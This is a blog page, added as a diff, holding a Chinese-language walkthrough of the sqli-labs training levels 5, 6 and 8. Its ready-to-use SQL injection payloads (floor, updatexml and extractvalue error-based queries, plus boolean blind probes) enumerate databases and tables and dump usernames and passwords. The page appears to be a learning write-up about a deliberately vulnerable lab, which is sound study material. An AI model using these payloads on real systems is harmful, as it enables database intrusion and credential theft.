@@ -1,0 +1,223 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>sqllabs-Less5，6，8 | 风不及你甜</title><meta name="author" content="wdraemv"><meta name="copyright" content="wdraemv"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="Less-5正确的思路是盲注。从源代码中可以看到，运行返回结果正确的时候只返回 you are in….，不会返回数据库当中的信息了(但会print_f(mysql_error())，这点很重要)，所以我们不能利用前面 less1-4 的方法。  报错注入 发现sql语句有错误，这里就想到报错注入 什么是报错注入呢？ 报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqllabs-Less5，6，8">
+<meta property="og:url" content="http://example.com/2020/12/20/sql-5/index.html">
+<meta property="og:site_name" content="风不及你甜">
+<meta property="og:description" content="Less-5正确的思路是盲注。从源代码中可以看到，运行返回结果正确的时候只返回 you are in….，不会返回数据库当中的信息了(但会print_f(mysql_error())，这点很重要)，所以我们不能利用前面 less1-4 的方法。  报错注入 发现sql语句有错误，这里就想到报错注入 什么是报错注入呢？ 报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2020-12-20T05:30:44.000Z">
+<meta property="article:modified_time" content="2021-02-04T07:25:38.000Z">
+<meta property="article:author" content="wdraemv">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2020/12/20/sql-5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.3.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: ture,
+  islazyload: false,
+  isanchor: true
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2021-02-04 15:25:38'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="风不及你甜" type="application/atom+xml">
+</head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1034630181&amp;spec=100" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">33</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/-%E9%9F%B3%E4%B9%90"><i class="fa-fw /music/"></i><span> 清单|| fa fa-heartbeat</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-5"><span class="toc-number">1.</span> <span class="toc-text">Less-5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">floor报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%BA%93%E5%90%8D"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">查询库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">查询表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2username%E3%80%81password%E5%AD%97%E6%AE%B5%E7%9A%84%E5%80%BC"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">查询username、password字段的值</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#updatexml%E6%8A%A5%E9%94%99"><span class="toc-number">1.1.2.</span> <span class="toc-text">updatexml报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text">extractvalue函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bool%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.2.</span> <span class="toc-text">bool盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-6"><span class="toc-number">2.</span> <span class="toc-text">Less-6</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-8"><span class="toc-number">3.</span> <span class="toc-text">Less-8</span></a></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">风不及你甜</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/-%E9%9F%B3%E4%B9%90"><i class="fa-fw /music/"></i><span> 清单|| fa fa-heartbeat</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">sqllabs-Less5，6，8</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-12-20T05:30:44.000Z" title="Created 2020-12-20 13:30:44">2020-12-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-02-04T07:25:38.000Z" title="Updated 2021-02-04 15:25:38">2021-02-04</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>正确的思路是盲注。从源代码中可以看到，运行返回结果正确的时候只返回 you are in….，不会返回数据库当中的信息了(但会print_f(mysql_error())，这点很重要)，所以我们不能利用前面 less1-4 的方法。</p>
+<p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/ruAMsa53pVQWN7FLK88i5oesWiKujP3BwLjltbe1c8bcBOfwHsFrb8rF1wsVhZNLQG.36Y8KZh6semKW7SLx7obVw5Kq2rLof7STS.sr5zM!/b&bo=7gO9AgAAAAADB3A!&rf=viewer_4" alt="img"></p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcebXzZr*awVGjLYjCtYYYsxACdR6tCVgLBHc6efH4Sy1KypKJpPLO5*sp44NOquuVyVRTBYJuxsPKvhM*OkEGMg!/b&bo=rwbyAgAAAAADN0s!&rf=viewer_4" alt="img"></p>
+<p>发现sql语句有错误，这里就想到报错注入</p>
+<p>什么是报错注入呢？</p>
+<p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。0x7e=’~’</p>
+<p>首先介绍三种报错注入常用的语句： (1). 通过floor报错 and (select 1 from (select<br>count(*),concat(( payload),floor (rand(0)*2))x from<br>information_schema.tables group by x)a) 其中payload为你要插入的SQL语句<br>需要注意的是该语句将 输出字符长度限制为64个字符</p>
+<p>(2). 通过updatexml报错 and updatexml(1, payload,1)<br>同样该语句对输出的字符长度也做了限制，其最长输出32位<br>并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效</p>
+<p>(3). 通过ExtractValue报错 and extractvalue(1, payload) 输出字符有长度限制，最长32位。<br>这些是我参考大佬的博客所得到的</p>
+<h3 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h3><h4 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h4><p>?id=1’ and (select 1 from (select count(*),concat((select group_concat(schema_name) from information_schema.schemata),floor (rand()*2)) as x from information_schema.tables group by x) as a) –+</p>
+<p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcebXzZr*awVGjLYjCtYYYsyy*Q7GpOWP*esLON54spX7cerxiSeJVG3Fj4KbgJetkPIsFkvpguvq1DF8rkCxnac!/b&bo=QQfNAgAAAAADN5s!&rf=viewer_4" alt="img"></p>
+<p>提示说输出信息超过一行，说明这里数据库名组成的字符串长度超过了64位(group_concat()函数最大长度为64位)—-但是我测试了一下最多可以有70多位，要用limit 来一个个输出<br>1、limit 0,1<br>?id=1’ and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),floor (rand()*2)) as x from information_schema.tables group by x) as a) –+<br>查出了名为information_schema的数据库</p>
+<p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcebXzZr*awVGjLYjCtYYYswXoqJjJY.h3AAjrikyJ2O78xIqohsD01TM30J8H1EYxZIqpbxVadc.kPbe6703rEg!/b&bo=TwfeAgAAAAADN4Y!&rf=viewer_4" alt="img"></p>
+<p><strong>2、limit 1,1</strong><br>?id=1’ and (select 1 from (select count(<em>),concat((select schema_name from information_schema.schemata limit 1,1),floor (rand()<em>2)) as x from information_schema.tables group by x) as a) –+`<br>查出了名为</em></em>challenges**的数据库</p>
+<p><strong>3、limit 2,1</strong><br>?id=1’ and (select 1 from (select count(<em>),concat((select schema_name from information_schema.schemata limit 2,1),floor (rand()<em>2)) as x from information_schema.tables group by x) as a) –+`<br>查出来名为</em></em>mysql**的数据库</p>
+<p><strong>4、limit 3,1</strong><br>?id=1’ and (select 1 from (select count(<em>),concat((select schema_name from information_schema.schemata limit 3,1),floor (rand()<em>2)) as x from information_schema.tables group by x) as a) –+`<br>查出来名为</em></em>performance_schema**的数据库</p>
+<p><strong>5、limit 4,1</strong><br>?id=1’ and (select 1 from (select count(<em>),concat((select schema_name from information_schema.schemata limit 4,1),floor (rand()<em>2)) as x from information_schema.tables group by x) as a) –+`<br>查出来名为</em></em>security**的数据库<br>然后是limit 5,1 ，是名为test的数据库</p>
+<p>直到limit 6,1，不报错.说明只有6条数据库</p>
+<h4 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h4><p>这里利用<strong>security</strong>库，在<strong>limit 3,1</strong>里找到了<strong>users</strong>表</p>
+<p>?id=1’ and (select 1 from (select count(*),concat(((select concat(table_name) from information_schema.tables where table_schema=’security’ limit 3,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) –+</p>
+<p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcebXzZr*awVGjLYjCtYYYsyy*Q7GpOWP*esLON54spX7cerxiSeJVG3Fj4KbgJetkPIsFkvpguvq1DF8rkCxnac!/b&bo=QQfNAgAAAAADN5s!&rf=viewer_4" alt="img"></p>
+<h4 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h4><p>下面查询users表里的字段<br>limit 0,1 是id<br>?id=1’ and (select 1 from (select count(*),concat((select concat(column_name,’;’) from information_schema.columns where table_name=’users’ limit 0,1),floor(rand()*2)) as x from information_schema.columns group by x) as a) –+</p>
+<p>limit 1,1 是username</p>
+<p>?id=1’ and (select 1 from (select count(*),concat((select concat(column_name,’;’) from information_schema.columns where table_name=’users’ limit 1,1),floor(rand()*2)) as x from information_schema.columns group by x) as a) –+</p>
+<p>limit 2,1 是password</p>
+<p>?id=1’ and (select 1 from (select count(*),concat((select concat(column_name,’;’) from information_schema.columns where table_name=’users’ limit 2,1),floor(rand()*2)) as x from information_schema.columns group by x) as a) –+</p>
+<h4 id="查询username、password字段的值"><a href="#查询username、password字段的值" class="headerlink" title="查询username、password字段的值"></a>查询username、password字段的值</h4><p>同样 limit 0,1<br>?id=1’ and(select 1 from (select count(*),concat((select concat(username,’: ‘,password,’;’) from security.users limit 0,1),floor(rand()*2)) as x from security.users group by x) as a)–+</p>
+<p>limit 1,1<br>?id=1’ and(select 1 from (select count(*),concat((select concat(username,’: ‘,password,’;’) from security.users limit 1,1),floor(rand()*2)) as x from security.users group by x) as a)–+`</p>
+<p>…….</p>
+<p>依次输出；</p>
+<h3 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h3><p>UpdateXML(xml_target, xpath_expr, new_xml)</p>
+<p><strong>xml_target:：</strong> 需要操作的xml片段</p>
+<p><strong>xpath_expr：</strong> 需要更新的xml路径(Xpath格式)</p>
+<p><strong>new_xml：</strong> 更新后的内容</p>
+<p>此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 <em>xml_target</em> 新的XML片段 <em>new_xml</em> ，然后返回更改的XML。<em>xml_target</em>替换的部分 与<em>xpath_expr</em> 用户提供的XPath表达式匹配。</p>
+<p>爆数据库</p>
+<p>?id=1’ or updatexml(1,concat(0x7e,database(),0x7e),1)–+</p>
+<p>爆表名</p>
+<p>?id=1’ or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),0x7e),1)–+</p>
+<p>爆字段</p>
+<p>?id=1’ or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’),0x7e),1)–+</p>
+<p>爆字段的值</p>
+<p>?id=1’ or updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1)–+</p>
+<h3 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h3><p>ExtractValue(xml_frag, xpath_expr)</p>
+<p>ExtractValue()接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。</p>
+<p>第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径</p>
+<p>爆数据库<br>?id=1’  and extractvalue(1,concat(0x7e,database(),0x7e))–+<br>爆表名<br>?id=1’ and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x23))–+<br>爆列名（字段）<br>?id=1’ and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name=’users’ limit 1,1),0x23))–+<br>爆值<br>?id=1’ and extractvalue(1,concat(0x23,(select username from users limit 1,1),0x23))–+<br>这里也需要不断改变limit的条件，找到我们想要的表名，字段名！</p>
+<h2 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h2><p>观察到如果正确，就输出you are in……；如果不正确，就不输出。<br>如id=3，有这个值，所以输出了you are in。id=-3，是错误的，所以输出了空白<br>因此可以根据这个现象来推测。</p>
+<p>?id=3’ and length(database())=7–+<br>‘ 的作用，是闭合。length(database())是得到数据库的字符串长度。<br>字符串长度不是7，报错。<br><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/ruAMsa53pVQWN7FLK88i5iK1LfZHtBibppwAzKxkanK10fruAIqsN3KNOvsbFinub5XsXUzjpMXQt7CIGS2UcrcZxMBS.6FDPecMBZQdgKA!/b&bo=aQZTAwAAAAADBx0!&rf=viewer_4" alt="img"></p>
+<p>字符串长度等于8，没报错了</p>
+<p>说明字符串的长度是8。即数据库的名字有8个字符。</p>
+<p>?id=3’ and ascii(substr(database(),1,1))&gt;115–+</p>
+<ol>
+<li><p>substr(var1, var2, var3)</p>
+<p>功能：从字符串里截取其中一段字符（串）</p>
+<ul>
+<li>var1：被截取的字符串</li>
+<li>var2：从哪一位开始截取</li>
+<li>var3：截取长度</li>
+</ul>
+</li>
+<li><p>ascii(var)</p>
+<p>功能：取var字符的ascii码（十进制）</p>
+</li>
+</ol>
+<p><img src="https://img-blog.csdnimg.cn/20200727193113387.png" alt="在这里插入图片描述"></p>
+<p>数据库的第一位字符的ASCII码值大于114，不大于115，所以是115。<br>查表可知115对应的字符是s,即第一位是s</p>
+<p>100正常，101报错， 对应的是e</p>
+<p>?id=3’ and ascii(substr(database(),2,1))&gt;100–+<br>98正常，99报错， 对应的是c</p>
+<p>?id=3’ and ascii(substr(database(),3,1))&gt;98–+<br>……<br>120正常，121报错， 对应的是y</p>
+<p>?id=3’ and ascii(substr(database(),8,1))&gt;120–+<br>得出数据库的名字是：security</p>
+<p>知道了库名，就是表名了：</p>
+<p>100正常，101报错， 对应的是e</p>
+<p>?id=3’  and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=’security’),1,1))&gt;100–+<br>108正常，109报错，对应的是m</p>
+<p>?id=3’  and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=’security’),2,1))&gt;108–+<br>emails<br>利用limit来输出其他的表名</p>
+<p>……<br>就这样，得出表名，列名及字段（参考报错注入）</p>
+<h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><p>第六关原理和第五关一样，就是第六关是双引号，解法同上</p>
+<h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><p>第八关也是一样的</p>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">wdraemv</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2020/12/20/sql-5/">http://example.com/2020/12/20/sql-5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/01/20/sql-9/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">sql-9</div></div></a></div><div class="next-post pull-right"><a href="/2020/11/23/wd/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">双查询注入</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By wdraemv</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script></div></body></html>
